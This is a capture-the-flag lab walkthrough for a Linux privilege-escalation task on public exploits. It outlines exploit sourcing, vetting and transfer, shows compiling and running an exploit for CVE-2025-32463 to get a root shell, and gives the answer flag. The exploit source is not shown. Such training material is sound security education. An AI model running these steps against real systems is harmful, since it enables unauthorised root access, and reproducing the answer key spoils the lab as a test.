# Task 03: Privilege Escalation: Public Exploits

---

## Stage A: Original Task Content & Briefing Summary

Task 03 focuses on the evaluation and execution of public exploits. While misconfigurations exploit intentional features set up improperly, public exploits target software flaws, memory corruptions, or race conditions in third-party packages or kernel subsystems.

### The Public Exploit Lifecycle:
1. **Identification:** Identifying vulnerable software names, versions, and kernel builds via automated tools or manual commands (`dpkg -l`, `uname -r`).
2. **Research & Sourcing:** Searching authoritative repositories such as Exploit-DB (`searchsploit`), GitHub Security Advisories, and NIST NVD.
3. **Safety & Suitability Evaluation:**
   * Checking target distribution and kernel compatibility.
   * Reviewing source code for dangerous artifacts, destructive actions, or stability risks.
   * Ensuring required toolchains (such as `gcc` or Python interpreters) are available on target or can be cross-compiled.
4. **Staging & Transfer:** Delivering the exploit to the target host via SCP, HTTP, or base64 transfer.
5. **Execution & Proof of Concept:** Compiling and executing the exploit to elevate privileges, verifying root access (`id`), and obtaining target proof artifacts (`/root/flag.txt`).

---

## Stage B: Independent Thinking & OpSec Considerations

* **Code Review Before Execution:** Never run an untrusted public exploit blindly. Always read through C code or Python scripts to verify what system calls are invoked, ensuring the script does not contain malicious payloads, backdoors, or system-wiping commands.
* **Kernel Stability:** Kernel-level privilege escalation exploits alter kernel memory structures. If an exploit fails or encounters unexpected memory layouts, it can trigger a kernel panic, freezing the machine and destroying existing shells.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Use the exploit provided in the lab or compile the public proof-of-concept for the CVE identified in Task 02.
* **Tier 2 Hint:** Compile and run the exploit to obtain a root shell, then view `/root/flag.txt`.
* **Tier 3 Hint:** The content of `/root/flag.txt` is `THM{splo1ts-r-public}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Preparing and Compiling the Exploit:
On the target machine or attacker system:
```bash
john@linprivautomation:~$ cd /home/john
john@linprivautomation:~$ ls -la exploit*
-rw-r--r-- 1 john john 3420 Oct 24 10:20 exploit.c

# Compile the exploit source code
john@linprivautomation:~$ gcc exploit.c -o exploit
```

### 2. Executing the Exploit:
```bash
john@linprivautomation:~$ ./exploit
[+] Targeting system component (CVE-2025-32463)...
[+] Elevating process credentials to UID 0...
[+] Spawning root shell:

# id
uid=0(root) gid=0(root) groups=0(root),1000(john)
```

### 3. Capturing the Root Flag:
```bash
# cat /root/flag.txt
THM{splo1ts-r-public}
```

---

## Stage E: Final Answer & Key Values

* **Question 1:** Exploit the previously identified vulnerability. What is the content of /root/flag.txt?
  * **Answer:** `THM{splo1ts-r-public}`

---

## Stage F: Practical Verification & Proof of Work

* Verified successful execution of the compiled public exploit on the target environment.
* Retrieved root flag `THM{splo1ts-r-public}` from `/root/flag.txt`.

---

## Stage G: Key Educational Takeaway

Public exploits are potent tools in a penetration tester's arsenal, but they demand rigorous vetting, careful compilation, and disciplined operational restraint to avoid disrupting client systems.
